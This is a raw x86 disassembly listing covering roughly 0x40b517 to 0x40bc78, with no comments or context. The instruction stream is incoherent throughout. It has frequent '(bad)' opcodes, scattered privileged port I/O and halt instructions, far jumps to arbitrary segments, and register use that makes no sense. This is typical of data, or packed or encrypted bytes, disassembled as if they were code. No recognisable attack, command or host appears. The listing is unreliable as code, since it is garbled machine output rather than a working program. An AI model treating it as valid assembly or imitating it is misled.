  40b517:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b518:	mov    ebx,0xcc444f1
  40b51d:	ins    DWORD PTR es:[edi],dx
  40b51e:	jmp    0xceff:0x4be22cca
  40b525:	aas    
  40b526:	push   0xffffffba
  40b528:	enter  0x6925,0x9
  40b52c:	out    0x9d,eax
  40b52e:	adc    DWORD PTR [ebx+0x37],ebp
  40b531:	mov    al,BYTE PTR es:[esi-0x6671f0b8]
  40b538:	pop    es
  40b539:	hlt    
  40b53a:	push   0xfffffff7
  40b53c:	xchg   edx,eax
  40b53d:	dec    edx
  40b53e:	movq   QWORD PTR [ebx-0x2a36a4b3],mm4
  40b545:	mov    bl,0x66
  40b547:	in     al,dx
  40b548:	mov    eax,0xafb022b8
  40b54d:	adc    cl,cl
  40b54f:	arpl   WORD PTR [eax+0x4828ef1],bx
  40b555:	stos   BYTE PTR es:[edi],al
  40b556:	cmc    
  40b557:	mov    edi,edi
  40b559:	cmp    DWORD PTR [edx+0x52],eax
  40b55c:	(bad)  
  40b55d:	push   ds
  40b55e:	test   eax,0x7ebfb699
  40b563:	mov    edi,DWORD PTR [ecx+0x6]
  40b566:	cmc    
  40b567:	dec    ecx
  40b568:	xor    dh,BYTE PTR [edx+0x1c]
  40b56b:	push   0x919610a4
  40b570:	jecxz  0x40b502
  40b572:	fld    DWORD PTR [edi-0x47]
  40b575:	les    eax,FWORD PTR [eax-0x7]
  40b578:	(bad)  
  40b579:	iret   
  40b57a:	es push 0x85ee20ff
  40b580:	stc    
  40b581:	mov    ebx,0x64e50de5
  40b586:	ins    DWORD PTR es:[edi],dx
  40b587:	lods   eax,DWORD PTR ds:[esi]
  40b588:	shr    esi,cl
  40b58a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b58b:	dec    ebx
  40b58c:	jo     0x40b5c0
  40b58e:	in     al,dx
  40b58f:	jmp    0x40b5b2
  40b591:	or     dl,cl
  40b593:	mov    dh,BYTE PTR [ebx-0x37]
  40b596:	test   eax,0xb388c363
  40b59b:	adc    BYTE PTR [edx],al
  40b59d:	cmp    bl,cl
  40b59f:	add    bl,BYTE PTR [ebp-0x67b695ff]
  40b5a5:	or     BYTE PTR [edx+0x56],ah
  40b5a8:	cld    
  40b5a9:	adc    BYTE PTR [esi],ah
  40b5ab:	ja     0x40b5bd
  40b5ad:	cmp    eax,0x1dbb3800
  40b5b2:	jmp    0x40b585
  40b5b4:	dec    ecx
  40b5b5:	pop    es
  40b5b6:	repnz cmp BYTE PTR [ebx+esi*4+0x292bcf4c],ch
  40b5be:	lds    esi,FWORD PTR [ebp+0x5a2098a4]
  40b5c4:	or     DWORD PTR [ecx+0x675987f0],ecx
  40b5ca:	xchg   esp,eax
  40b5cb:	and    BYTE PTR [ebp+eax*8+0x4f727c3a],bh
  40b5d2:	push   edx
  40b5d3:	ds test eax,0x747e4da6
  40b5d9:	in     al,dx
  40b5da:	mov    dl,0xa7
  40b5dc:	dec    ebx
  40b5dd:	jbe    0x40b57b
  40b5df:	xor    ah,BYTE PTR [edx+0x124fda9d]
  40b5e5:	jb     0x40b651
  40b5e7:	dec    edx
  40b5e8:	xchg   esp,eax
  40b5e9:	jge    0x40b5ab
  40b5eb:	mov    ebx,DWORD PTR [edi]
  40b5ed:	hlt    
  40b5ee:	mul    BYTE PTR [eax-0x32]
  40b5f1:	inc    esi
  40b5f2:	xlat   BYTE PTR ds:[ebx]
  40b5f3:	and    DWORD PTR [esi+ebp*2],ebp
  40b5f6:	cmc    
  40b5f7:	xchg   ebx,eax
  40b5f8:	in     eax,dx
  40b5f9:	and    DWORD PTR [edx+0x46ac10da],edx
  40b5ff:	bound  esp,QWORD PTR [eax-0x5f]
  40b602:	(bad)  
  40b604:	mov    esi,0x64ee918e
  40b609:	repz sub eax,0x28865496
  40b60f:	mov    cl,0x15
  40b611:	mov    WORD PTR [edi-0x6e7a10c3],?
  40b617:	cmc    
  40b618:	pop    ebx
  40b619:	fmul   st,st(4)
  40b61b:	xchg   edi,eax
  40b61c:	scas   eax,DWORD PTR es:[edi]
  40b61d:	sbb    DWORD PTR [edx],0x4402afb2
  40b623:	mov    ds:0xcef8daa,eax
  40b628:	pop    esi
  40b629:	in     eax,dx
  40b62a:	xor    ebp,DWORD PTR [ecx-0x6eb416da]
  40b630:	xlat   BYTE PTR ds:[ebx]
  40b631:	pop    eax
  40b632:	mov    ecx,0xa32f1d47
  40b637:	mov    esp,0x4678dca9
  40b63c:	mov    WORD PTR [edi],cs
  40b63e:	fwait
  40b63f:	or     dl,BYTE PTR [edx]
  40b641:	adc    DWORD PTR [edx-0x4086906c],edi
  40b647:	js     0x40b5e5
  40b649:	outs   dx,BYTE PTR ds:[esi]
  40b64a:	pop    esp
  40b64b:	mov    ecx,0xdd932226
  40b650:	int    0xb0
  40b652:	add    eax,0xcf8f600b
  40b657:	dec    ebx
  40b658:	scas   eax,DWORD PTR es:[edi]
  40b659:	pop    ss
  40b65a:	inc    edi
  40b65b:	mov    cl,0x3b
  40b65d:	sub    eax,0x9e6154c1
  40b662:	fwait
  40b663:	xchg   ecx,eax
  40b664:	daa    
  40b665:	mov    dh,0xe6
  40b667:	bound  edi,QWORD PTR [edi+0x2a46b410]
  40b66d:	push   edx
  40b66e:	pop    ecx
  40b670:	xor    eax,0x738fcecb
  40b675:	fiadd  WORD PTR [ecx+0x49]
  40b678:	mov    ds:0x903f1282,al
  40b67d:	xchg   BYTE PTR [ebx],dh
  40b67f:	push   eax
  40b680:	in     eax,dx
  40b681:	mov    esp,0x1c4f3e0c
  40b686:	mov    dh,0x71
  40b688:	xor    esi,ebp
  40b68a:	sbb    BYTE PTR [eax],0xe1
  40b68d:	jnp    0x40b6da
  40b68f:	mov    ebx,es
  40b691:	outs   dx,DWORD PTR ds:[esi]
  40b692:	xchg   BYTE PTR [ecx],al
  40b694:	out    0xb0,eax
  40b696:	pop    eax
  40b697:	nop
  40b698:	inc    edx
  40b699:	xor    cl,ah
  40b69b:	cdq    
  40b69c:	mov    ebp,0xffe4f341
  40b6a1:	dec    eax
  40b6a2:	add    esi,edx
  40b6a4:	(bad)  
  40b6a5:	mov    dh,0x2d
  40b6a7:	mov    bh,0x92
  40b6a9:	jle    0x40b6cb
  40b6ab:	and    eax,0x241be805
  40b6b0:	push   eax
  40b6b1:	mov    dl,0x7e
  40b6b3:	lods   eax,DWORD PTR ds:[esi]
  40b6b4:	test   DWORD PTR [esi+0x4c],edi
  40b6b7:	les    edx,FWORD PTR [edi+0x1a]
  40b6ba:	mov    ds:0xf7a46c44,eax
  40b6bf:	dec    ebp
  40b6c0:	cld    
  40b6c1:	mov    ds,WORD PTR [ebp+eiz*4-0x3a108ebc]
  40b6c8:	mov    bl,0xf2
  40b6ca:	daa    
  40b6cb:	jns    0x40b72b
  40b6cd:	stc    
  40b6ce:	cdq    
  40b6cf:	aad    0x86
  40b6d1:	xchg   esp,eax
  40b6d2:	cmp    eax,eax
  40b6d4:	into   
  40b6d5:	jmp    0x40b695
  40b6d7:	mov    ch,0xa1
  40b6d9:	es in  eax,dx
  40b6db:	js     0x40b69a
  40b6dd:	jecxz  0x40b6c8
  40b6df:	mov    esi,0x6e7049b9
  40b6e4:	adc    eax,DWORD PTR gs:[ebx+0x22e76798]
  40b6eb:	sbb    edi,DWORD PTR [edi-0xe]
  40b6ee:	xchg   ecx,eax
  40b6ef:	cmp    al,0x9b
  40b6f1:	adc    eax,0x3007b92b
  40b6f6:	ja     0x40b68d
  40b6f8:	sbb    al,0xb5
  40b6fa:	outs   dx,DWORD PTR ds:[esi]
  40b6fb:	iret   
  40b6fc:	adc    cl,BYTE PTR [ebp+0x5]
  40b6ff:	xchg   esi,eax
  40b700:	sti    
  40b701:	pusha  
  40b702:	and    BYTE PTR [edi+edi*1-0x66],0x1c
  40b707:	rol    esp,cl
  40b709:	jbe    0x40b76f
  40b70b:	xchg   ecx,eax
  40b70c:	outs   dx,BYTE PTR ds:[esi]
  40b70d:	pop    ss
  40b70e:	jne    0x40b695
  40b710:	mov    edi,0xc7dc90f
  40b715:	cld    
  40b716:	stc    
  40b717:	aad    0x2e
  40b719:	clc    
  40b71a:	sub    edi,edi
  40b71c:	jb     0x40b725
  40b71e:	inc    edx
  40b71f:	hlt    
  40b720:	mov    ah,BYTE PTR [esi+0x32]
  40b723:	shl    BYTE PTR [eax+0x22176655],1
  40b729:	push   ss
  40b72a:	aas    
  40b72b:	out    0xa7,eax
  40b72d:	cwde   
  40b72e:	pusha  
  40b72f:	enter  0xf7b3,0x42
  40b733:	pop    ebp
  40b734:	add    edi,edi
  40b736:	add    BYTE PTR [ecx-0x55],0x56
  40b73a:	pushf  
  40b73b:	(bad)  
  40b73c:	(bad)
  40b740:	pop    edi
  40b741:	pop    es
  40b742:	xchg   edx,eax
  40b743:	and    eax,0x5d395c61
  40b748:	inc    esp
  40b749:	and    eax,0x4c0b799f
  40b74e:	in     eax,dx
  40b74f:	arpl   WORD PTR [edi+0xb],dx
  40b752:	jbe    0x40b71d
  40b754:	iret   
  40b755:	aad    0xad
  40b757:	lds    edx,FWORD PTR [eax-0x7d0521c5]
  40b75d:	inc    esi
  40b75e:	in     al,0xb
  40b760:	cwde   
  40b761:	test   DWORD PTR [edi+0x564e54f4],ebx
  40b767:	call   0x7ad8:0x6f0e7bfc
  40b76e:	rcl    DWORD PTR ds:0x28466b3b,cl
  40b774:	gs out dx,eax
  40b776:	adc    bl,BYTE PTR [eax-0x50]
  40b779:	xor    DWORD PTR [edi+0x39],esp
  40b77c:	fidivr DWORD PTR [ebp-0x78]
  40b77f:	and    bl,BYTE PTR [ebp-0x9]
  40b782:	inc    edx
  40b783:	nop
  40b784:	mov    ds:0x96f023,al
  40b789:	sbb    al,0xf5
  40b78b:	mov    al,0x14
  40b78d:	adc    eax,0x668a1349
  40b792:	loope  0x40b753
  40b794:	mov    bl,0xeb
  40b796:	lock cs js 0x40b7ed
  40b79a:	sahf   
  40b79b:	mov    BYTE PTR [ebp-0x83d9530],dh
  40b7a1:	lods   al,BYTE PTR ds:[esi]
  40b7a2:	scas   eax,DWORD PTR es:[edi]
  40b7a3:	ror    al,0x65
  40b7a6:	cmp    eax,0xb11abef0
  40b7ab:	out    0x20,al
  40b7ad:	mov    dh,0x30
  40b7af:	push   ds
  40b7b0:	inc    ebx
  40b7b1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b7b2:	cs rcl ebp,0x58
  40b7b6:	mov    dh,0x3a
  40b7b8:	stos   BYTE PTR es:[edi],al
  40b7b9:	pop    esi
  40b7ba:	test   al,0x90
  40b7bc:	dec    esi
  40b7bd:	push   esi
  40b7be:	cmc    
  40b7bf:	pop    ds
  40b7c0:	jno    0x40b76e
  40b7c2:	pop    es
  40b7c3:	jno    0x40b843
  40b7c5:	es jae 0x40b845
  40b7c8:	and    al,0x23
  40b7ca:	retf   0xbcbb
  40b7cd:	mov    ch,BYTE PTR [ecx]
  40b7cf:	ret    0xa48f
  40b7d2:	addr16 jne 0x40b823
  40b7d5:	mov    ecx,0x7af66faf
  40b7da:	mov    al,ds:0x75960701
  40b7df:	dec    esi
  40b7e0:	or     esi,DWORD PTR [edx]
  40b7e2:	pop    ebx
  40b7e3:	dec    esi
  40b7e4:	mov    cl,0x37
  40b7e6:	jmp    0x40b7b0
  40b7e8:	xchg   ebp,eax
  40b7e9:	inc    edx
  40b7ea:	cmp    DWORD PTR [ebx+0x7c08392f],edx
  40b7f0:	cmp    edi,edi
  40b7f2:	push   ebp
  40b7f3:	xchg   ebx,eax
  40b7f4:	(bad)  ds:0x9172551f
  40b7fa:	addr16 cwde 
  40b7fc:	or     esp,edx
  40b7fe:	pop    edx
  40b7ff:	xlat   BYTE PTR ds:[ebx]
  40b800:	jecxz  0x40b839
  40b802:	das    
  40b803:	xchg   esp,eax
  40b804:	mov    cl,0x61
  40b806:	inc    eax
  40b807:	or     DWORD PTR [ebx+0x5db5c438],ebx
  40b80d:	pop    ss
  40b80e:	mov    dh,0x55
  40b810:	(bad)  
  40b811:	and    al,0xa5
  40b813:	cmp    eax,0xffffff8a
  40b816:	stc    
  40b817:	ret    
  40b818:	test   DWORD PTR [ebx-0x55],ecx
  40b81b:	mov    eax,0xcd46c57d
  40b820:	hlt    
  40b821:	push   es
  40b822:	into   
  40b823:	div    BYTE PTR [edx]
  40b825:	retf   
  40b826:	ins    DWORD PTR es:[edi],dx
  40b827:	xor    DWORD PTR [eax+0x572ff95d],eax
  40b82d:	pop    esi
  40b82e:	aam    0x36
  40b830:	std    
  40b831:	loope  0x40b7eb
  40b833:	fs cmc 
  40b835:	push   edx
  40b836:	pop    esi
  40b837:	lods   al,BYTE PTR ds:[esi]
  40b838:	ror    DWORD PTR [edx+0x53],cl
  40b83b:	dec    ebx
  40b83c:	pusha  
  40b83d:	jle    0x40b832
  40b83f:	add    eax,0x3a085d66
  40b844:	daa    
  40b845:	push   edx
  40b846:	je     0x40b8ab
  40b848:	fsqrt  
  40b84a:	jmp    0x3701:0xcef83a9e
  40b851:	add    bh,ah
  40b853:	(bad)  
  40b854:	or     esp,DWORD PTR [ecx-0x1e]
  40b857:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b858:	pop    ecx
  40b859:	sbb    DWORD PTR [esi-0x65],edi
  40b85c:	(bad)  
  40b85d:	jge    0x40b80f
  40b85f:	adc    dh,BYTE PTR [edx]
  40b861:	outs   dx,DWORD PTR ds:[esi]
  40b862:	scas   al,BYTE PTR es:[edi]
  40b863:	je     0x40b8dd
  40b865:	mov    bl,0xb7
  40b867:	call   0x9a6:0x49cdc581
  40b86e:	mov    ebx,ebx
  40b870:	sar    DWORD PTR [edx],cl
  40b872:	pop    edx
  40b873:	gs xchg esi,eax
  40b875:	adc    eax,0x24ab1811
  40b87a:	cmp    DWORD PTR [edx-0x28],0xffffffe3
  40b87e:	(bad)  
  40b87f:	addr16 adc eax,0x40d21d45
  40b885:	push   esi
  40b886:	add    ebp,DWORD PTR [ecx]
  40b888:	mov    BYTE PTR [ebx],ah
  40b88a:	or     eax,0x6e06f818
  40b88f:	mov    dh,BYTE PTR [esi+ebx*2+0x471a8c25]
  40b896:	sub    edi,ecx
  40b898:	mov    esp,0x9633d04b
  40b89d:	dec    ecx
  40b89e:	sbb    al,0xea
  40b8a0:	or     al,BYTE PTR [ebx-0x27e6d655]
  40b8a6:	repnz rol DWORD PTR [ebp-0x68e46bb2],1
  40b8ad:	push   0xffffffc5
  40b8af:	(bad)  
  40b8b0:	leave  
  40b8b1:	jle    0x40b882
  40b8b3:	lods   eax,DWORD PTR ds:[esi]
  40b8b4:	fld    DWORD PTR [ecx+0x6]
  40b8b7:	shl    DWORD PTR ds:0x6a0d00ae,1
  40b8bd:	cs (bad) 
  40b8bf:	enter  0x7ba5,0xed
  40b8c3:	ror    DWORD PTR [edx],1
  40b8c5:	pop    es
  40b8c6:	out    dx,eax
  40b8c7:	in     al,0x28
  40b8c9:	xchg   BYTE PTR [ebp-0x10e8fd01],bl
  40b8cf:	dec    edi
  40b8d0:	inc    esi
  40b8d1:	ds xchg esi,eax
  40b8d3:	mov    edx,0x9adf01e9
  40b8d8:	rcr    BYTE PTR [ecx],1
  40b8da:	aaa    
  40b8db:	out    dx,eax
  40b8dc:	xchg   ebp,eax
  40b8dd:	sar    DWORD PTR [ebx],cl
  40b8df:	aad    0x53
  40b8e1:	xchg   ebp,eax
  40b8e2:	mov    ch,0xac
  40b8e4:	sub    al,0xb9
  40b8e6:	hlt    
  40b8e7:	pop    ss
  40b8e8:	jnp    0x40b8ff
  40b8ea:	pop    eax
  40b8eb:	mov    ecx,0x37c22490
  40b8f0:	in     al,0xfc
  40b8f2:	pop    ds
  40b8f3:	xor    al,ah
  40b8f5:	sub    dl,al
  40b8f7:	inc    ebx
  40b8f8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b8f9:	les    ebp,FWORD PTR [ebp+0x63]
  40b8fc:	mov    ecx,0xd60312b2
  40b901:	mov    BYTE PTR [eax+0x825c867],al
  40b907:	call   0x2e019c54
  40b90c:	(bad)  
  40b90d:	fstp   TBYTE PTR [eax+0x6e]
  40b910:	sahf   
  40b911:	aaa    
  40b912:	test   BYTE PTR [ebx+0x7932f136],ch
  40b918:	lahf   
  40b919:	xchg   ebp,eax
  40b91a:	or     BYTE PTR [esi],0x55
  40b91d:	dec    cx
  40b91f:	push   esi
  40b920:	fwait
  40b921:	mov    BYTE PTR [edx+0x7e50296f],bh
  40b927:	push   0x46
  40b929:	rol    edi,1
  40b92b:	jmp    0x2e0:0x783cad49
  40b932:	add    dl,ah
  40b934:	fs leave 
  40b936:	mov    eax,edx
  40b938:	shl    DWORD PTR [edi-0x7a],1
  40b93b:	icebp  
  40b93c:	inc    edi
  40b93d:	xchg   ebx,eax
  40b93e:	clc    
  40b93f:	mov    BYTE PTR [eax+0x31726fa5],bl
  40b945:	gs mov esp,0xe2b88135
  40b94b:	dec    edi
  40b94c:	shr    eax,1
  40b94e:	xchg   ebx,eax
  40b94f:	push   ds
  40b950:	popa   
  40b951:	call   0x4b8f25fa
  40b956:	add    eax,0x4e33b44f
  40b95b:	sbb    eax,DWORD PTR [edi+0x5a999b3]
  40b961:	xchg   esi,eax
  40b962:	dec    edi
  40b963:	out    0xa3,al
  40b965:	adc    ebx,esi
  40b967:	dec    ebp
  40b968:	inc    ebx
  40b969:	mov    eax,0x8c05042a
  40b96e:	jae    0x40b9b2
  40b970:	gs inc ebp
  40b972:	imul   esi,edi,0x4a3a9ac5
  40b978:	je     0x40b97a
  40b97a:	mov    eax,0x281aa240
  40b97f:	dec    edx
  40b980:	daa    
  40b981:	repnz push edx
  40b983:	shl    ebx,cl
  40b985:	addr16 lock push ebp
  40b988:	hlt    
  40b989:	jg     0x40b9dc
  40b98b:	ror    esp,cl
  40b98d:	(bad)  
  40b98f:	push   esi
  40b990:	sub    BYTE PTR ds:0x7c8649dc,bh
  40b996:	xlat   BYTE PTR ds:[ebx]
  40b997:	push   cs
  40b998:	inc    cx
  40b99a:	fstp   TBYTE PTR [edx+0x2d]
  40b99d:	push   edx
  40b99e:	daa    
  40b99f:	cmp    DWORD PTR [ebp-0x526e6f7b],eax
  40b9a5:	xchg   ebx,eax
  40b9a6:	dec    edi
  40b9a7:	inc    ebp
  40b9a8:	arpl   bx,di
  40b9aa:	and    ebp,DWORD PTR [ebp+ebp*1-0x1]
  40b9ae:	xchg   ebp,eax
  40b9af:	xor    eax,0x95c56b41
  40b9b4:	aad    0xf0
  40b9b6:	ja     0x40ba29
  40b9b8:	jne    0x40b993
  40b9ba:	pop    eax
  40b9bb:	aad    0x56
  40b9bd:	outs   dx,DWORD PTR ds:[esi]
  40b9be:	jo     0x40b9ae
  40b9c0:	out    0xb4,eax
  40b9c2:	push   ds
  40b9c3:	inc    DWORD PTR ds:0xd5099d2e
  40b9c9:	sahf   
  40b9ca:	dec    esp
  40b9cb:	pop    es
  40b9cc:	cs and al,0x6f
  40b9cf:	xchg   BYTE PTR [edi-0x1d],ah
  40b9d2:	jb     0x40ba39
  40b9d4:	sub    al,0xf0
  40b9d6:	xchg   esp,eax
  40b9d7:	in     al,dx
  40b9d8:	test   BYTE PTR [esi],al
  40b9da:	mov    ds:0x7dd2129e,ax
  40b9e0:	sbb    BYTE PTR cs:[edx],bh
  40b9e3:	sbb    ebp,DWORD PTR [ebp+0x78]
  40b9e6:	dec    esi
  40b9e7:	cmp    eax,0x86fc35b4
  40b9ec:	sbb    DWORD PTR [edi+ebp*8],0xffffffe0
  40b9f0:	cmc    
  40b9f1:	sbb    cl,al
  40b9f3:	push   es
  40b9f4:	dec    edi
  40b9f5:	push   cs
  40b9f6:	push   0x30
  40b9f8:	push   edx
  40b9f9:	in     al,0x1
  40b9fb:	xor    DWORD PTR [ecx-0x511671e8],esi
  40ba01:	and    al,0xa9
  40ba03:	xlat   BYTE PTR ds:[ebx]
  40ba04:	dec    edx
  40ba05:	and    DWORD PTR [edx],ebp
  40ba07:	lahf   
  40ba08:	adc    DWORD PTR [ebp-0x16],0xfffffff4
  40ba0c:	cmp    DWORD PTR [ebp-0x5c],ebx
  40ba0f:	(bad)  
  40ba10:	mov    cl,BYTE PTR [ecx+0x74]
  40ba13:	in     eax,dx
  40ba14:	into   
  40ba15:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ba16:	xor    al,0x17
  40ba18:	mov    ds:0x4f2a690,al
  40ba1d:	jp     0x40b9fa
  40ba1f:	xchg   BYTE PTR [eax+0x50],dl
  40ba22:	and    eax,0xc941ef99
  40ba27:	pop    edi
  40ba28:	push   edx
  40ba29:	push   esi
  40ba2a:	adc    bl,BYTE PTR [esi-0x446d38f8]
  40ba30:	pop    edi
  40ba31:	mov    ah,0xbb
  40ba33:	dec    ebp
  40ba34:	je     0x40b9f4
  40ba36:	mov    DWORD PTR [esp+edi*1+0x52f0ad8c],eax
  40ba3d:	xchg   esi,eax
  40ba3e:	or     bh,BYTE PTR [esi]
  40ba40:	clc    
  40ba41:	out    dx,eax
  40ba42:	sbb    BYTE PTR [ebp+0x6a4222d0],bh
  40ba48:	push   eax
  40ba49:	in     eax,0xa8
  40ba4b:	dec    ebx
  40ba4c:	std    
  40ba4d:	mov    bh,0xe1
  40ba4f:	imul   ecx,DWORD PTR [eax+edx*2],0x4b945e03
  40ba56:	stos   DWORD PTR es:[edi],eax
  40ba57:	jmp    0x957:0xb66ae9c
  40ba5e:	add    bh,BYTE PTR [ebx-0x38c1f9c6]
  40ba64:	dec    esp
  40ba65:	mov    al,0x99
  40ba67:	dec    ecx
  40ba68:	aam    0x7d
  40ba6a:	ror    ecx,0x9c
  40ba6d:	les    ecx,FWORD PTR [edx]
  40ba6f:	scas   eax,DWORD PTR es:[edi]
  40ba70:	adc    al,0xec
  40ba72:	lods   eax,DWORD PTR ds:[esi]
  40ba73:	outs   dx,DWORD PTR ds:[esi]
  40ba74:	mov    gs,WORD PTR [ebx+edx*8]
  40ba77:	sar    DWORD PTR [esi-0x211dfd4f],1
  40ba7d:	lods   eax,DWORD PTR ds:[esi]
  40ba7e:	cmp    BYTE PTR [esi-0xc1a45d5],0x1
  40ba85:	rcl    dl,cl
  40ba87:	mov    edi,0x450a8b67
  40ba8c:	xor    DWORD PTR [bp+di],edi
  40ba8f:	retf   0x4fb1
  40ba92:	inc    edi
  40ba93:	jle    0x40ba4d
  40ba95:	dec    esi
  40ba96:	lods   al,BYTE PTR ds:[esi]
  40ba97:	jb     0x40babc
  40ba99:	retf   0x9f1f
  40ba9c:	out    0xfc,al
  40ba9e:	dec    ebp
  40ba9f:	jmp    0x40ba6c
  40baa1:	jecxz  0x40babe
  40baa3:	cmp    BYTE PTR [ebx],dl
  40baa5:	arpl   WORD PTR [ecx-0x6c],cx
  40baa8:	mov    bl,0x2a
  40baaa:	inc    ebx
  40baab:	mov    ds:0x4057716a,al
  40bab0:	cmp    eax,0x243229cc
  40bab5:	xchg   esi,eax
  40bab6:	call   0x20e52d99
  40babb:	cld    
  40babc:	mov    esi,0xa5a3e70
  40bac1:	cdq    
  40bac2:	sti    
  40bac3:	xor    DWORD PTR [esi+ecx*4-0x5cc979f0],edx
  40baca:	and    BYTE PTR [ebx-0x4379e333],dl
  40bad0:	repnz jmp 0xd72:0x5a3efaa3
  40bad8:	dec    DWORD PTR [eax-0x549d0664]
  40bade:	lahf   
  40badf:	into   
  40bae0:	mov    DWORD PTR [edx],esp
  40bae2:	call   0x8cc9be94
  40bae7:	dec    ebp
  40bae8:	mov    bl,0x4
  40baea:	push   ds
  40baeb:	int3   
  40baec:	out    0x19,al
  40baee:	ret    
  40baef:	js     0x40bb44
  40baf1:	add    BYTE PTR [eax-0x73],cl
  40baf4:	retf   0x1ee1
  40baf7:	enter  0x145a,0xd4
  40bafb:	cmc    
  40bafc:	inc    ebp
  40bafd:	inc    edi
  40bafe:	pop    ebx
  40baff:	push   0x40
  40bb01:	test   DWORD PTR [eax],0x4049ce5d
  40bb07:	rcr    BYTE PTR [edx+0x2d],cl
  40bb0a:	(bad)  
  40bb0b:	(bad)  
  40bb0c:	jmp    0x5199:0x64200b6d
  40bb13:	mov    esp,0xf3051efd
  40bb18:	popa   
  40bb19:	mov    ds:0xf781633f,al
  40bb1e:	loopne 0x40baa2
  40bb20:	xor    DWORD PTR [eax-0x32],edx
  40bb23:	adc    dl,BYTE PTR [eax-0x37]
  40bb26:	mov    al,0x19
  40bb28:	(bad)  
  40bb2a:	push   ecx
  40bb2b:	mov    edi,0xd94ead39
  40bb30:	mov    ecx,DWORD PTR [edx+0x6c]
  40bb33:	or     DWORD PTR [edx-0x96fd5a1],esi
  40bb39:	test   BYTE PTR [edi+0xb],0x75
  40bb3d:	add    DWORD PTR [edx+0x7caa60c1],ebp
  40bb43:	sbb    al,0xc9
  40bb45:	sub    DWORD PTR [edx+0x21],ebp
  40bb48:	pop    ecx
  40bb49:	jge    0x40bad8
  40bb4b:	pop    edx
  40bb4c:	mov    ah,0xac
  40bb4e:	jecxz  0x40badb
  40bb50:	mov    ecx,DWORD PTR [eax]
  40bb52:	mov    ah,0xa1
  40bb54:	popf   
  40bb55:	sub    DWORD PTR [eax-0x5b],eax
  40bb58:	nop
  40bb59:	sub    edi,edx
  40bb5b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bb5c:	fistp  QWORD PTR [ebp-0x2fcc193]
  40bb62:	push   eax
  40bb63:	sar    BYTE PTR [esi],1
  40bb65:	repz dec ebp
  40bb67:	cwde   
  40bb68:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bb69:	gs pop esp
  40bb6b:	in     al,dx
  40bb6c:	and    DWORD PTR [eax],esi
  40bb6e:	repnz shl BYTE PTR [edi+0xe5b363],1
  40bb75:	cmp    BYTE PTR [ebp-0x7c39e6e5],al
  40bb7b:	ss adc al,0xe0
  40bb7e:	pop    edi
  40bb7f:	adc    cl,dh
  40bb81:	test   BYTE PTR [edi],bh
  40bb83:	lea    edi,[esp+eax*1-0x4f]
  40bb87:	mov    bh,0x60
  40bb89:	imul   esi,DWORD PTR [eax-0x57],0xb3cc6ed7
  40bb90:	mov    BYTE PTR [ebx+esi*8],bh
  40bb93:	gs in  al,dx
  40bb95:	mov    esi,0x536dc6a8
  40bb9a:	mov    fs,WORD PTR [edi-0x32]
  40bb9d:	out    0xab,al
  40bb9f:	xchg   ebp,eax
  40bba0:	lods   al,BYTE PTR ds:[esi]
  40bba1:	jecxz  0x40bc13
  40bba3:	ret    
  40bba4:	and    bh,ch
  40bba6:	retf   
  40bba7:	add    DWORD PTR [eax-0x371634d2],0xc25a31ee
  40bbb1:	xchg   bl,ch
  40bbb3:	xor    al,0x97
  40bbb5:	(bad)  
  40bbb6:	call   0xe9d2246
  40bbbb:	rcl    DWORD PTR [ecx-0x42b85eaa],1
  40bbc1:	imul   edx
  40bbc3:	test   DWORD PTR [eax-0x1d],esp
  40bbc6:	(bad)  
  40bbc7:	out    dx,eax
  40bbc8:	ins    BYTE PTR es:[edi],dx
  40bbc9:	cld    
  40bbca:	test   BYTE PTR [ebx-0x49],al
  40bbcd:	inc    eax
  40bbce:	lock or eax,0xaad944e
  40bbd4:	sub    BYTE PTR [ebx-0x69],ah
  40bbd7:	stos   DWORD PTR es:[edi],eax
  40bbd8:	ja     0x40bc25
  40bbda:	pushf  
  40bbdb:	xchg   esi,eax
  40bbdc:	ja     0x40bb5e
  40bbde:	ror    ah,1
  40bbe0:	lea    esp,ds:0xdf991cba
  40bbe6:	ret    0x7ef8
  40bbe9:	jo     0x40bc5c
  40bbeb:	xchg   BYTE PTR [ebx],cl
  40bbed:	sub    ecx,esp
  40bbef:	push   cs
  40bbf0:	or     DWORD PTR [ebp+0x5],edi
  40bbf3:	xor    BYTE PTR [edx+0x5c1d693f],ch
  40bbf9:	ja     0x40bc35
  40bbfb:	or     al,0xc6
  40bbfd:	into   
  40bbfe:	sbb    eax,0xf0c974d7
  40bc03:	daa    
  40bc04:	cmp    BYTE PTR [eax+ebx*1],al
  40bc07:	xor    eax,0x89c398a7
  40bc0c:	push   ds
  40bc0d:	std    
  40bc0e:	push   ecx
  40bc0f:	jmp    0x40bc84
  40bc11:	cwde   
  40bc12:	jns    0x40bc04
  40bc14:	jnp    0x40bc03
  40bc16:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bc17:	sbb    ebx,DWORD PTR ds:0x25193a55
  40bc1d:	xchg   DWORD PTR [edx-0x4c99ec66],eax
  40bc23:	jl     0x40bc7b
  40bc25:	fist   DWORD PTR [edi-0x2d0e9d64]
  40bc2b:	repnz popf 
  40bc2d:	jno    0x40bc9c
  40bc2f:	cmp    DWORD PTR [edi],0x8fe1aa8e
  40bc35:	int3   
  40bc36:	std    
  40bc37:	jbe    0x40bc50
  40bc39:	sbb    ebx,esp
  40bc3b:	mov    eax,ds:0x1756677e
  40bc40:	les    edx,FWORD PTR [edi+ebx*1+0x16a7da2f]
  40bc47:	sub    edi,DWORD PTR [esi-0x7cd1e267]
  40bc4d:	loop   0x40bcb1
  40bc4f:	inc    ebx
  40bc50:	int    0xd2
  40bc52:	add    eax,0x755d63bb
  40bc57:	pop    ebx
  40bc58:	mov    eax,ds:0x56c51925
  40bc5d:	pop    eax
  40bc5e:	jno    0x40bc05
  40bc60:	loope  0x40bc03
  40bc62:	pop    edi
  40bc63:	xchg   ebx,eax
  40bc64:	dec    ebx
  40bc65:	adc    bl,BYTE PTR [edi]
  40bc67:	pop    ecx
  40bc68:	and    eax,0xd740a3fc
  40bc6d:	enter  0x73bd,0x5f
  40bc71:	or     eax,0xb824f899
  40bc76:	cli    
  40bc77:	into   
  40bc78:	push   ebp
